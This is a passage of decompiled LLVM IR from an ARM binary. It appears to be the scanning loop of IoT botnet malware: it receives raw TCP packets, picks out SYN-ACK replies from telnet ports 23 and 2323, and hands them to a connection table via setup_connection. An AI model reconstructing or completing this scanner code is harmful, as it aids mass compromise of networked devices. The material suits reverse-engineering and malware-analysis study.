  %stack_var_-1880.1 = phi i32 [ %stack_var_-1880.0, %dec_label_pc_f00c ], [ %v0_f31c, %dec_label_pc_f31c ]
  %v0_f320 = call i32 @__GI___errno_location()
  store i32 %v2_f004, i32* %r1.global-to-local, align 4
  store i32 %v1_f32c, i32* @r4, align 4
  store i32 0, i32* @r5, align 4
  %v2_f33c = inttoptr i32 %v0_f320 to i32*
  br label %dec_label_pc_f334

dec_label_pc_f334:                                ; preds = %dec_label_pc_f3f8, %dec_label_pc_f3f0, %dec_label_pc_f3e8, %dec_label_pc_f3c4, %dec_label_pc_f3b4, %dec_label_pc_f39c, %dec_label_pc_f384, %dec_label_pc_f3e0, %dec_label_pc_f3d4, %dec_label_pc_f37c, %dec_label_pc_f4b8, %dec_label_pc_f320
  store i32 0, i32* %ip.global-to-local, align 4
  store i32 0, i32* %v2_f33c, align 4
  %v2_f348 = load i32, i32* @global_var_24fa0.155, align 4
  store i32 1514, i32* %r2.global-to-local, align 4
  store i32 %v2_f004, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_f358 = load i32, i32* %ip.global-to-local, align 4
  %v6_f360 = call i32 @__libc_recvfrom(i32 %v2_f348, i32 %v2_f004, i32 1514, i32 16384, i32 %v0_f358, i32 %v0_f358)
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_f364 = icmp eq i32 %v6_f360, 0
  store i1 %v2_f364, i1* %cpsr_z.global-to-local, align 1
  %tmp408 = icmp slt i32 %v6_f360, 1
  br i1 %tmp408, label %dec_label_pc_f4c8, label %dec_label_pc_f36c

dec_label_pc_f36c:                                ; preds = %dec_label_pc_f334
  store i32 %v0_f320, i32* %ip.global-to-local, align 4
  %v2_f370 = load i32, i32* %v2_f33c, align 4
  store i32 %v2_f370, i32* %r3.global-to-local, align 4
  %v2_f374 = icmp ugt i32 %v2_f370, 10
  store i1 %v2_f374, i1* %cpsr_c.global-to-local, align 1
  %v7_f374 = icmp eq i32 %v2_f370, 11
  store i1 %v7_f374, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f374, label %dec_label_pc_f4c8, label %dec_label_pc_f37c

dec_label_pc_f37c:                                ; preds = %dec_label_pc_f36c
  %v2_f37c = icmp ugt i32 %v6_f360, 38
  store i1 %v2_f37c, i1* %cpsr_c.global-to-local, align 1
  %v7_f37c = icmp eq i32 %v6_f360, 39
  store i1 %v7_f37c, i1* %cpsr_z.global-to-local, align 1
  %v2_f380 = xor i1 %v2_f37c, true
  %v3_f380 = or i1 %v7_f37c, %v2_f380
  br i1 %v3_f380, label %dec_label_pc_f334, label %dec_label_pc_f384

dec_label_pc_f384:                                ; preds = %dec_label_pc_f37c
  store i32 %v2_f004, i32* @lr, align 4
  store i32 ptrtoint (i32* @global_var_24f80.59 to i32), i32* %r1.global-to-local, align 4
  %v3_f38c = load i32, i32* %v2_f38c, align 4
  store i32 %v3_f38c, i32* %r2.global-to-local, align 4
  %v2_f390 = load i32, i32* @global_var_24f80.59, align 4
  store i32 %v2_f390, i32* %r3.global-to-local, align 4
  %v3_f394 = icmp uge i32 %v3_f38c, %v2_f390
  store i1 %v3_f394, i1* %cpsr_c.global-to-local, align 1
  %v9_f394 = icmp eq i32 %v3_f38c, %v2_f390
  store i1 %v9_f394, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_f394, label %dec_label_pc_f39c, label %dec_label_pc_f334

dec_label_pc_f39c:                                ; preds = %dec_label_pc_f384
  %v3_f39c = load i8, i8* %v2_f39c, align 1
  %v4_f39c = zext i8 %v3_f39c to i32
  store i32 %v4_f39c, i32* %r3.global-to-local, align 4
  %v2_f3a0 = icmp ugt i8 %v3_f39c, 5
  store i1 %v2_f3a0, i1* %cpsr_c.global-to-local, align 1
  %v7_f3a0 = icmp eq i8 %v3_f39c, 6
  store i1 %v7_f3a0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f3a0, label %dec_label_pc_f3a8, label %dec_label_pc_f334

dec_label_pc_f3a8:                                ; preds = %dec_label_pc_f39c
  %v0_f3a8 = load i32, i32* @r4, align 4
  %v1_f3a8 = inttoptr i32 %v0_f3a8 to i16*
  %v2_f3a8 = load i16, i16* %v1_f3a8, align 2
  %v3_f3a8 = zext i16 %v2_f3a8 to i32
  store i32 %v3_f3a8, i32* %ip.global-to-local, align 4
  %v2_f3ac = icmp ugt i16 %v2_f3a8, 5887
  store i1 %v2_f3ac, i1* %cpsr_c.global-to-local, align 1
  %v7_f3ac = icmp eq i16 %v2_f3a8, 5888
  store i1 %v7_f3ac, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f3ac, label %dec_label_pc_f3c4, label %dec_label_pc_f3b4

dec_label_pc_f3b4:                                ; preds = %dec_label_pc_f3a8
  store i32 4873, i32* %r3.global-to-local, align 4
  %v3_f3bc = icmp ugt i16 %v2_f3a8, 4872
  store i1 %v3_f3bc, i1* %cpsr_c.global-to-local, align 1
  %v9_f3bc = icmp eq i16 %v2_f3a8, 4873
  store i1 %v9_f3bc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_f3bc, label %dec_label_pc_f3c4, label %dec_label_pc_f334

dec_label_pc_f3c4:                                ; preds = %dec_label_pc_f3b4, %dec_label_pc_f3a8
  %v1_f3c4 = add i32 %v0_f3a8, 2
  %v2_f3c4 = inttoptr i32 %v1_f3c4 to i16*
  %v3_f3c4 = load i16, i16* %v2_f3c4, align 2
  %v4_f3c4 = zext i16 %v3_f3c4 to i32
  store i32 %v4_f3c4, i32* %r3.global-to-local, align 4
  store i32 %v4_eee8, i32* %r2.global-to-local, align 4
  %v3_f3cc = icmp uge i32 %v4_f3c4, %v4_eee8
  store i1 %v3_f3cc, i1* %cpsr_c.global-to-local, align 1
  %v9_f3cc = icmp eq i32 %v4_f3c4, %v4_eee8
  store i1 %v9_f3cc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_f3cc, label %dec_label_pc_f3d4, label %dec_label_pc_f334

dec_label_pc_f3d4:                                ; preds = %dec_label_pc_f3c4
  %v1_f3d4 = add i32 %v0_f3a8, 13
  %v2_f3d4 = inttoptr i32 %v1_f3d4 to i8*
  %v3_f3d4 = load i8, i8* %v2_f3d4, align 1
  %v4_f3d4 = zext i8 %v3_f3d4 to i32
  store i32 %v4_f3d4, i32* %r3.global-to-local, align 4
  %v1_f3d8 = and i32 %v4_f3d4, 2
  %v2_f3d8 = icmp eq i32 %v1_f3d8, 0
  store i1 %v2_f3d8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_f3d8, label %dec_label_pc_f334, label %dec_label_pc_f3e0

dec_label_pc_f3e0:                                ; preds = %dec_label_pc_f3d4
  %v1_f3e0 = and i32 %v4_f3d4, 16
  %v2_f3e0 = icmp eq i32 %v1_f3e0, 0
  store i1 %v2_f3e0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_f3e0, label %dec_label_pc_f334, label %dec_label_pc_f3e8

dec_label_pc_f3e8:                                ; preds = %dec_label_pc_f3e0
  %v1_f3e8 = and i32 %v4_f3d4, 4
  %v2_f3e8 = icmp eq i32 %v1_f3e8, 0
  store i1 %v2_f3e8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_f3e8, label %dec_label_pc_f3f0, label %dec_label_pc_f334

dec_label_pc_f3f0:                                ; preds = %dec_label_pc_f3e8
  %tmp = urem i8 %v3_f3d4, 2
  %v2_f3f0 = icmp eq i8 %tmp, 0
  store i1 %v2_f3f0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_f3f0, label %dec_label_pc_f3f8, label %dec_label_pc_f334

dec_label_pc_f3f8:                                ; preds = %dec_label_pc_f3f0
  %v1_f3f8 = add i32 %v0_f3a8, 8
  %v2_f3f8 = inttoptr i32 %v1_f3f8 to i32*
  %v3_f3f8 = load i32, i32* %v2_f3f8, align 4
  %v5_f410 = call i32 @llvm.bswap.i32(i32 %v3_f3f8)
  %v1_f414 = add i32 %v5_f410, -1
  store i32 %v1_f414, i32* %r2.global-to-local, align 4
  %v1_f418 = and i32 %v1_f414, 16711680
  %v3_f41c = udiv i32 %v1_f414, 16777216
  %v4_f424 = udiv i32 %v1_f418, 256
  %v5_f424 = or i32 %v4_f424, %v3_f41c
  %v1_f420 = mul i32 %v1_f414, 256
  %v4_f428 = and i32 %v1_f420, 16711680
  %v5_f428 = or i32 %v5_f424, %v4_f428
  store i32 %v5_f428, i32* %r3.global-to-local, align 4
  store i32 %v2_f004, i32* %r1.global-to-local, align 4
  %v3_f430 = load i32, i32* %v2_f430, align 4
  store i32 %v3_f430, i32* @lr, align 4
  %v5_f434 = call i32 @llvm.bswap.i32(i32 %v1_f414)
  store i32 %v5_f434, i32* %r3.global-to-local, align 4
  %v3_f438 = icmp uge i32 %v5_f434, %v3_f430
  store i1 %v3_f438, i1* %cpsr_c.global-to-local, align 1
  %v9_f438 = icmp eq i32 %v5_f434, %v3_f430
  store i1 %v9_f438, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_f438, label %dec_label_pc_f440, label %dec_label_pc_f334

dec_label_pc_f440:                                ; preds = %dec_label_pc_f3f8
  %v0_f440 = load i32, i32* @r5, align 4
  %v3_f440 = icmp ugt i32 %v0_f440, 355
  store i1 %v3_f440, i1* %cpsr_c.global-to-local, align 1
  %v8_f440 = icmp eq i32 %v0_f440, 356
  store i1 %v8_f440, i1* %cpsr_z.global-to-local, align 1
  %v6_f444 = icmp slt i32 %v0_f440, 356
  br i1 %v6_f444, label %dec_label_pc_f448, label %dec_label_pc_f4c8

dec_label_pc_f448:                                ; preds = %dec_label_pc_f440
  store i32 ptrtoint (i32* @global_var_24f9c.153 to i32), i32* %r2.global-to-local, align 4
  %v2_f454 = load i32, i32* @global_var_24f9c.153, align 4
  store i32 %v2_f454, i32* %r1.global-to-local, align 4
  %v3_f45c = mul i32 %v0_f440, 388
  store i32 %v3_f45c, i32* %r3.global-to-local, align 4
  %v2_f460 = add i32 %v2_f454, %v3_f45c
  store i32 %v2_f460, i32* @r0, align 4
  %v1_f464 = add i32 %v2_f460, 12
  %v2_f464 = inttoptr i32 %v1_f464 to i32*
  %v3_f464 = load i32, i32* %v2_f464, align 4
  store i32 %v3_f464, i32* %r2.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_f468 = icmp eq i32 %v3_f464, 0
  store i1 %v2_f468, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_f468, label %dec_label_pc_f4b0, label %dec_label_pc_f48c.preheader

dec_label_pc_f48c.preheader:                      ; preds = %dec_label_pc_f448
  %v2_f46c = add i32 %v0_f440, 1
  %v3_f478 = mul i32 %v2_f46c, 97
  %v2_f47c = and i32 %v3_f478, 1073741824
  %v3_f47c = icmp ne i32 %v2_f47c, 0
  store i1 %v3_f47c, i1* %cpsr_c.global-to-local, align 1
  %v4_f47c = mul i32 %v2_f46c, 388
  %v3_f480 = add i32 %v2_f454, %v4_f47c
  store i32 %v3_f480, i32* %r3.global-to-local, align 4
  store i32 %v0_f440, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_f48c

dec_label_pc_f48c:                                ; preds = %dec_label_pc_f48c.preheader, %dec_label_pc_f498
  %v0_f498 = phi i32 [ %v3_f480, %dec_label_pc_f48c.preheader ], [ %v1_f4a4, %dec_label_pc_f498 ]
  %v0_f48c = phi i32 [ %v0_f440, %dec_label_pc_f48c.preheader ], [ %v1_f48c, %dec_label_pc_f498 ]
  %v1_f48c = add i32 %v0_f48c, 1
  store i32 %v1_f48c, i32* %r2.global-to-local, align 4
  %v7_f490 = icmp eq i32 %v1_f48c, 356
  br i1 %v7_f490, label %dec_label_pc_f4c8.loopexit, label %dec_label_pc_f498

dec_label_pc_f498:                                ; preds = %dec_label_pc_f48c
  store i32 %v0_f498, i32* @r0, align 4
  %v1_f49c = add i32 %v0_f498, 12
  %v2_f49c = inttoptr i32 %v1_f49c to i32*
  %v3_f49c = load i32, i32* %v2_f49c, align 4
  %v2_f4a0 = icmp eq i32 %v3_f49c, 0
  %v1_f4a4 = add i32 %v0_f498, 388
  store i32 %v1_f4a4, i32* %r3.global-to-local, align 4
  br i1 %v2_f4a0, label %dec_label_pc_f4ac, label %dec_label_pc_f48c

dec_label_pc_f4ac:                                ; preds = %dec_label_pc_f498
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_f48c, i32* @r5, align 4
  br label %dec_label_pc_f4b0

dec_label_pc_f4b0:                                ; preds = %dec_label_pc_f448, %dec_label_pc_f4ac
  %v1_f4b8 = phi i32 [ %v2_f460, %dec_label_pc_f448 ], [ %v0_f498, %dec_label_pc_f4ac ]
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_f4b0 = icmp eq i32 %v1_f4b8, 0
  store i1 %v2_f4b0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_f4b0, label %dec_label_pc_f4c8, label %dec_label_pc_f4b8

dec_label_pc_f4b8:                                ; preds = %dec_label_pc_f4b0
  %v2_f4b8 = add i32 %v1_f4b8, 16
  %v3_f4b8 = inttoptr i32 %v2_f4b8 to i32*
  store i32 %v3_f430, i32* %v3_f4b8, align 4
  %v0_f4bc = load i32, i32* %ip.global-to-local, align 4
  %v1_f4bc = trunc i32 %v0_f4bc to i16
  %v2_f4bc = load i32, i32* @r0, align 4
  %v3_f4bc = add i32 %v2_f4bc, 20
  %v4_f4bc = inttoptr i32 %v3_f4bc to i16*
  store i16 %v1_f4bc, i16* %v4_f4bc, align 2
  %v0_f4c0 = call i32 @setup_connection()
  br label %dec_label_pc_f334

dec_label_pc_f4c8.loopexit:                       ; preds = %dec_label_pc_f48c
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_f4c8

dec_label_pc_f4c8:                                ; preds = %dec_label_pc_f440, %dec_label_pc_f4b0, %dec_label_pc_f36c, %dec_label_pc_f334, %dec_label_pc_f4c8.loopexit
  store i32 0, i32* %stack_var_-224, align 4
  store i32 8, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 1676, i32* %ip.global-to-local, align 4
  %v2_f4e8514 = load i32, i32* @sp, align 4
  %v3_f4e8515 = add i32 %v2_f4e8514, 1676
  %v4_f4e8516 = inttoptr i32 %v3_f4e8515 to i32*
  store i32 0, i32* %v4_f4e8516, align 4
  br label %dec_label_pc_f4d4.dec_label_pc_f4d4_crit_edge

dec_label_pc_f4d4.dec_label_pc_f4d4_crit_edge:    ; preds = %dec_label_pc_f4c8, %dec_label_pc_f4d4.dec_label_pc_f4d4_crit_edge
  %v0_f4d4.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_f4d8 = add i32 %v0_f4d4.pre, 4
  store i32 %v1_f4d8, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_f4e0 = add i32 %v0_f4d4.pre, 1672
  store i32 %v1_f4e0, i32* %ip.global-to-local, align 4
  %v7_f4e4 = icmp eq i32 %v1_f4d8, 128
  %v2_f4e8 = load i32, i32* @sp, align 4
  %v3_f4e8 = add i32 %v2_f4e8, %v1_f4e0
  %v4_f4e8 = inttoptr i32 %v3_f4e8 to i32*
  store i32 0, i32* %v4_f4e8, align 4
  br i1 %v7_f4e4, label %dec_label_pc_f4f0, label %dec_label_pc_f4d4.dec_label_pc_f4d4_crit_edge

dec_label_pc_f4f0:                                ; preds = %dec_label_pc_f4d4.dec_label_pc_f4d4_crit_edge
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  %v0_f4f0 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v0_f4f0, i32* %stack_var_-352, align 4
  %v1_f4fc517 = add i32 %v0_f4f0, 8
  store i32 %v1_f4fc517, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v1_f504518 = add i32 %v0_f4f0, 1548
  store i32 %v1_f504518, i32* @lr, align 4
  %v7_f508519 = icmp eq i32 %v1_f4fc517, 128
  %v2_f50c520 = load i32, i32* @sp, align 4
  %v3_f50c521 = add i32 %v2_f50c520, %v1_f504518
  %v4_f50c522 = inttoptr i32 %v3_f50c521 to i32*
  store i32 0, i32* %v4_f50c522, align 4
  br i1 %v7_f508519, label %dec_label_pc_f514, label %dec_label_pc_f4f8.dec_label_pc_f4f8_crit_edge

dec_label_pc_f4f8.dec_label_pc_f4f8_crit_edge:    ; preds = %dec_label_pc_f4f0, %dec_label_pc_f4f8.dec_label_pc_f4f8_crit_edge
  %v0_f4f8.pre = load i32, i32* %r3.global-to-local, align 4
  %v1_f4fc = add i32 %v0_f4f8.pre, 4
  store i32 %v1_f4fc, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v1_f504 = add i32 %v0_f4f8.pre, 1544
  store i32 %v1_f504, i32* @lr, align 4
  %v7_f508 = icmp eq i32 %v1_f4fc, 128
  %v2_f50c = load i32, i32* @sp, align 4
  %v3_f50c = add i32 %v2_f50c, %v1_f504
  %v4_f50c = inttoptr i32 %v3_f50c to i32*
  store i32 0, i32* %v4_f50c, align 4
  br i1 %v7_f508, label %dec_label_pc_f514, label %dec_label_pc_f4f8.dec_label_pc_f4f8_crit_edge

dec_label_pc_f514:                                ; preds = %dec_label_pc_f4f8.dec_label_pc_f4f8_crit_edge, %dec_label_pc_f4f0
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  %v0_f514 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v0_f514, i32* @r5, align 4
  store i32 %v0_f514, i32* @r6, align 4
  store i32 %v0_f514, i32* %stack_var_-52, align 4
  br label %dec_label_pc_f570

dec_label_pc_f524:                                ; preds = %dec_label_pc_f5a4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 %v7_f590, i1* %cpsr_z.global-to-local, align 1
  %v1_f614 = add i32 %v2_f588, 4
  %v2_f614 = inttoptr i32 %v1_f614 to i32*
  %v3_f614 = load i32, i32* %v2_f614, align 4
  br i1 %v7_f590, label %dec_label_pc_f614, label %dec_label_pc_f52c

dec_label_pc_f52c:                                ; preds = %dec_label_pc_f524
  store i32 %v3_f614, i32* %ip.global-to-local, align 4
  %v3_f530 = udiv i32 %v3_f614, 32
  store i32 %v2_f620, i32* %r1.global-to-local, align 4
  %v3_f538 = mul nuw nsw i32 %v3_f530, 4
  %v2_f53c = add i32 %v3_f538, %v2_f620
  store i32 %v2_f53c, i32* %r3.global-to-local, align 4
  %v1_f540 = add i32 %v2_f53c, -184
  %v2_f540 = inttoptr i32 %v1_f540 to i32*
  %v3_f540 = load i32, i32* %v2_f540, align 4
  %v1_f544 = urem i32 %v3_f614, 32
  store i32 1, i32* %r1.global-to-local, align 4
  %v7_f54c = shl i32 1, %v1_f544
  %v8_f54c = or i32 %v3_f540, %v7_f54c
  store i32 %v8_f54c, i32* %r2.global-to-local, align 4
  store i32 %v8_f54c, i32* %v2_f540, align 4
  %v0_f554 = load i32, i32* @r6, align 4
  %v1_f554 = load i32, i32* %ip.global-to-local, align 4
  %v3_f554 = icmp uge i32 %v0_f554, %v1_f554
  store i1 %v3_f554, i1* %cpsr_c.global-to-local, align 1
  %v9_f554 = icmp eq i32 %v0_f554, %v1_f554
  store i1 %v9_f554, i1* %cpsr_z.global-to-local, align 1
  %v5_f558 = icmp slt i32 %v0_f554, %v1_f554
  br i1 %v5_f558, label %bb409, label %bb410

bb409:                                            ; preds = %dec_label_pc_f52c
  store i32 %v1_f554, i32* @r6, align 4
  br label %bb410

bb410:                                            ; preds = %.thread76, %bb416, %bb414, %bb418, %dec_label_pc_f608, %dec_label_pc_f52c, %bb409
  %v3_f55c = load i32, i32* %stack_var_-52, align 4
  store i32 %v3_f55c, i32* %r3.global-to-local, align 4
  %v1_f560 = add i32 %v3_f55c, 1
  store i32 %v1_f560, i32* %r2.global-to-local, align 4
  %v3_f564 = icmp ugt i32 %v1_f560, 355
  store i1 %v3_f564, i1* %cpsr_c.global-to-local, align 1
  %v8_f564 = icmp eq i32 %v1_f560, 356
  store i1 %v8_f564, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_f560, i32* %stack_var_-52, align 4
  %v6_f56c = icmp slt i32 %v1_f560, 356
  br i1 %v6_f56c, label %dec_label_pc_f570, label %dec_label_pc_f644

dec_label_pc_f570:                                ; preds = %bb410, %dec_label_pc_f514
  %v1_f57c = phi i32 [ %v1_f560, %bb410 ], [ %v0_f514, %dec_label_pc_f514 ]
  store i32 ptrtoint (i32* @global_var_24f9c.153 to i32), i32* @r1, align 4
  %v2_f580 = load i32, i32* @global_var_24f9c.153, align 4
  store i32 %v2_f580, i32* %r2.global-to-local, align 4
  %v3_f584 = mul i32 %v1_f57c, 388
  store i32 %v3_f584, i32* %r3.global-to-local, align 4
  %v2_f588 = add i32 %v2_f580, %v3_f584
  store i32 %v2_f588, i32* @r4, align 4
  %v1_f58c = add i32 %v2_f588, 12
  %v2_f58c = inttoptr i32 %v1_f58c to i32*
  %v3_f58c = load i32, i32* %v2_f58c, align 4
  store i32 %v3_f58c, i32* %ip.global-to-local, align 4
  %v2_f590 = icmp ne i32 %v3_f58c, 0
  store i1 %v2_f590, i1* %cpsr_c.global-to-local, align 1
  %v7_f590 = icmp eq i32 %v3_f58c, 1
  store i1 %v7_f590, i1* %cpsr_z.global-to-local, align 1
  %v2_f594 = xor i1 %v2_f590, true
  %v3_f594 = or i1 %v7_f590, %v2_f594
  br i1 %v3_f594, label %bb411, label %bb412

bb411:                                            ; preds = %dec_label_pc_f570
  store i32 5, i32* @r1, align 4
  br label %bb412

bb412:                                            ; preds = %dec_label_pc_f570, %bb411
  %v1_f5b4215 = phi i32 [ ptrtoint (i32* @global_var_24f9c.153 to i32), %dec_label_pc_f570 ], [ 5, %bb411 ]
  %v2_f598 = xor i1 %v7_f590, true
  %v3_f598 = and i1 %v2_f590, %v2_f598
  br i1 %v3_f598, label %bb413, label %bb414

bb413:                                            ; preds = %bb412
  store i32 30, i32* @r1, align 4
  br label %bb414

bb414:                                            ; preds = %bb412, %bb413
  %v1_f5b4 = phi i32 [ %v1_f5b4215, %bb412 ], [ 30, %bb413 ]
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_f59c = icmp eq i32 %v3_f58c, 0
  store i1 %v2_f59c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_f59c, label %bb410, label %dec_label_pc_f5a4

dec_label_pc_f5a4:                                ; preds = %bb414
  store i32 ptrtoint (i32* @global_var_224b8.142 to i32), i32* %r2.global-to-local, align 4
  %v2_f5a8 = load i32, i32* @global_var_224b8.142, align 4
  store i32 %v2_f5a8, i32* %r3.global-to-local, align 4
  %v1_f5ac = add i32 %v2_f588, 8
  %v2_f5ac = inttoptr i32 %v1_f5ac to i32*
  %v3_f5ac = load i32, i32* %v2_f5ac, align 4
  store i32 %v3_f5ac, i32* %r2.global-to-local, align 4
  %v2_f5b0 = sub i32 %v2_f5a8, %v3_f5ac
  store i32 %v2_f5b0, i32* %r3.global-to-local, align 4
  %v3_f5b4 = icmp uge i32 %v2_f5b0, %v1_f5b4
  store i1 %v3_f5b4, i1* %cpsr_c.global-to-local, align 1
  %v9_f5b4 = icmp eq i32 %v2_f5b0, %v1_f5b4
  store i1 %v9_f5b4, i1* %cpsr_z.global-to-local, align 1
  %v2_f5b8 = xor i1 %v3_f5b4, true
  %v3_f5b8 = or i1 %v9_f5b4, %v2_f5b8
  br i1 %v3_f5b8, label %dec_label_pc_f524, label %dec_label_pc_f5bc

dec_label_pc_f5bc:                                ; preds = %dec_label_pc_f5a4
  %v1_f5bc = add i32 %v2_f588, 4
  %v2_f5bc = inttoptr i32 %v1_f5bc to i32*
  %v3_f5bc = load i32, i32* %v2_f5bc, align 4
  %v1_f5c0 = call i32 @__GI___libc_close(i32 %v3_f5bc)
  %v0_f5c4 = load i32, i32* @r4, align 4
  %v1_f5c4 = add i32 %v0_f5c4, 12
  %v2_f5c4 = inttoptr i32 %v1_f5c4 to i32*
  %v3_f5c4 = load i32, i32* %v2_f5c4, align 4
  store i32 %v3_f5c4, i32* %r3.global-to-local, align 4
  %v2_f5c8 = icmp ugt i32 %v3_f5c4, 1
  store i1 %v2_f5c8, i1* %cpsr_c.global-to-local, align 1
  %v7_f5c8 = icmp eq i32 %v3_f5c4, 2
  store i1 %v7_f5c8, i1* %cpsr_z.global-to-local, align 1
  %v2_f5cc = xor i1 %v2_f5c8, true
  %v3_f5cc = or i1 %v7_f5c8, %v2_f5cc
  br i1 %v3_f5cc, label %bb415, label %.thread300

.thread300:                                       ; preds = %dec_label_pc_f5bc
  store i32 -1, i32* %r2.global-to-local, align 4
  %v2_f5d4297301 = add i32 %v0_f5c4, 4
  %v3_f5d4298302 = inttoptr i32 %v2_f5d4297301 to i32*
  store i32 -1, i32* %v3_f5d4298302, align 4
  br label %bb416

bb415:                                            ; preds = %dec_label_pc_f5bc
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 -1, i32* %r2.global-to-local, align 4
  %v2_f5d4294 = add i32 %v0_f5c4, 4
  %v3_f5d4295 = inttoptr i32 %v2_f5d4294 to i32*
  store i32 -1, i32* %v3_f5d4295, align 4
  %v4_f5d8 = load i32, i32* %r3.global-to-local, align 4
  %v5_f5d8 = load i32, i32* @r4, align 4
  %v6_f5d8 = add i32 %v5_f5d8, 12
  %v7_f5d8 = inttoptr i32 %v6_f5d8 to i32*
  store i32 %v4_f5d8, i32* %v7_f5d8, align 4
  %v4_f5dc = load i32, i32* %r3.global-to-local, align 4
  %v5_f5dc = trunc i32 %v4_f5dc to i8
  %v6_f5dc = load i32, i32* @r4, align 4
  %v7_f5dc = add i32 %v6_f5dc, 384
  %v8_f5dc = inttoptr i32 %v7_f5dc to i8*
  store i8 %v5_f5dc, i8* %v8_f5dc, align 1
  %v0_f5e0.pre = load i1, i1* %cpsr_z.global-to-local, align 1
  %v1_f5e0.pre = load i1, i1* %cpsr_c.global-to-local, align 1
  br label %bb416

bb416:                                            ; preds = %.thread300, %bb415
  %v1_f5e0 = phi i1 [ %v1_f5e0.pre, %bb415 ], [ %v2_f5c8, %.thread300 ]
  %v0_f5e0 = phi i1 [ %v0_f5e0.pre, %bb415 ], [ false, %.thread300 ]
  %v2_f5e0 = xor i1 %v1_f5e0, true
  %v3_f5e0 = or i1 %v0_f5e0, %v2_f5e0
  br i1 %v3_f5e0, label %bb410, label %dec_label_pc_f5e4

dec_label_pc_f5e4:                                ; preds = %bb416
  %v0_f5e4 = load i32, i32* @r4, align 4
  %v1_f5e4 = add i32 %v0_f5e4, 384
  %v2_f5e4 = inttoptr i32 %v1_f5e4 to i8*
  %v3_f5e4 = load i8, i8* %v2_f5e4, align 1
  %v4_f5e4 = zext i8 %v3_f5e4 to i32
  %v1_f5e8 = add nuw nsw i32 %v4_f5e4, 1
  %v1_f5ec = urem i32 %v1_f5e8, 256
  store i32 %v1_f5ec, i32* %r3.global-to-local, align 4
  %v2_f5f0 = icmp ugt i32 %v1_f5ec, 9
  store i1 %v2_f5f0, i1* %cpsr_c.global-to-local, align 1
  %v7_f5f0 = icmp eq i32 %v1_f5ec, 10
  store i1 %v7_f5f0, i1* %cpsr_z.global-to-local, align 1
  %v1_f5f4 = trunc i32 %v1_f5e8 to i8
  store i8 %v1_f5f4, i8* %v2_f5e4, align 1
  %v0_f5f8 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_f5f8, label %.thread76, label %dec_label_pc_f608

.thread76:                                        ; preds = %dec_label_pc_f5e4
  %v1_f5f8 = load i32, i32* %r3.global-to-local, align 4
  %v2_f5f8 = add i32 %v1_f5f8, -10
  store i32 %v2_f5f8, i32* %r3.global-to-local, align 4
  %v2_f5fc = load i32, i32* @r4, align 4
  %v3_f5fc = add i32 %v2_f5fc, 12
  %v4_f5fc = inttoptr i32 %v3_f5fc to i32*
  store i32 %v2_f5f8, i32* %v4_f5fc, align 4
  %v1_f600 = load i32, i32* %r3.global-to-local, align 4
  %v2_f600 = trunc i32 %v1_f600 to i8
  %v3_f600 = load i32, i32* @r4, align 4
  %v4_f600 = add i32 %v3_f600, 384
  %v5_f600 = inttoptr i32 %v4_f600 to i8*
  store i8 %v2_f600, i8* %v5_f600, align 1
  %v0_f604.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_f604.pr.pr, label %bb410, label %dec_label_pc_f608

dec_label_pc_f608:                                ; preds = %dec_label_pc_f5e4, %.thread76
  %v0_f608 = load i32, i32* @r4, align 4
  store i32 %v0_f608, i32* @r0, align 4
  %v0_f60c = call i32 @setup_connection()
  br label %bb410

dec_label_pc_f614:                                ; preds = %dec_label_pc_f524
  %v3_f618 = udiv i32 %v3_f614, 32
  %v3_f61c = mul nuw nsw i32 %v3_f618, 4
  store i32 %v2_f620, i32* @lr, align 4
  %v2_f624 = add i32 %v3_f61c, %v2_f620
  store i32 %v2_f624, i32* %r3.global-to-local, align 4
  %v1_f628 = add i32 %v2_f624, -312
  %v2_f628 = inttoptr i32 %v1_f628 to i32*
  %v3_f628 = load i32, i32* %v2_f628, align 4
  %v1_f62c = urem i32 %v3_f614, 32
  store i32 %v1_f62c, i32* %r1.global-to-local, align 4
  %v7_f630 = shl i32 1, %v1_f62c
  %v8_f630 = or i32 %v3_f628, %v7_f630
  store i32 %v8_f630, i32* %r2.global-to-local, align 4
  %v0_f634 = load i32, i32* @r5, align 4
  %v3_f634 = icmp uge i32 %v0_f634, %v3_f614
  store i1 %v3_f634, i1* %cpsr_c.global-to-local, align 1
